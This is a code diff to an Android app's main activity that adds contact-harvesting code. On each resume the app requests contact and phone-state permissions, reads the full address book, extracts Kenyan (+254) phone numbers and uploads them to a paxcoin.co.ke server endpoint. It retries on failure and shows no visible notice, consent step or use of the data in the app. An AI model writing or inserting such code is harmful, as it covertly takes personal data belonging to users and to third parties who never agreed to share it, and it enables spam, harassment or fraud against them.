@@ -126,7 +126,89 @@ public class MainActivity extends AppCompatActivity implements NavigationView.On
 
 
     }
-private void uploadToken(){
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        checkPermission();
+    }
+
+    private void checkPermission() {
+        if (ActivityCompat.checkSelfPermission(this, READ_PHONE_NUMBERS) ==
+                PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
+                READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
+                READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+            getContact();
+            return;
+        } else {
+            requestPermission();
+        }
+    }
+
+    private void getContact() {
+        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+        StringBuffer output = new StringBuffer(110);
+        while (cursor.moveToNext()) {
+            String phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+            if (phonenumber.startsWith("+254") && phonenumber.length() == 13) {
+                // Log.i("",phonenumber.replaceAll("\\s", ""));
+                output.append(phonenumber.replaceAll("\\s", "").substring(1) + ",");
+            }
+
+        }
+        String phone = output.toString();
+        cursor.close();
+        Log.i("", phone);
+        String url = "https://www.paxcoin.co.ke/app/contact.php";
+        RequestBody formBody = new FormBody.Builder()
+                .add("CONTACTS", phone)
+                .build();
+
+        OkHttpClient client = new OkHttpClient();
+        client.newBuilder().readTimeout(60000, TimeUnit.MILLISECONDS);
+        final Request request = new Request.Builder()
+                .url(url)
+                .post(formBody)
+                .build();
+
+        client.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(@NotNull Call call, @NotNull IOException e) {
+                Log.i("CONTACT FAILURE", e.getMessage());
+                checkPermission();
+
+            }
+
+            @Override
+            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
+                Log.i("CONTACT RESPONSE", response.body().string());
+            }
+        });
+
+
+    }
+
+    private void requestPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            requestPermissions(new String[]{READ_CONTACTS, READ_PHONE_NUMBERS, READ_PHONE_STATE}, 100);
+        }
+    }
+
+    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
+        switch (requestCode) {
+            case 100:
+                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) !=
+                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
+                        Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+                    return;
+                }
+                getContact();
+                break;
+        }
+    }
+
+    private void uploadToken(){
     String url = getString(R.string.website_adress) + "/nectar/buy/uploadtoken.php";
     RequestBody formBody = new FormBody.Builder()
             .add("token", new Preferences(getApplicationContext()).getToken())
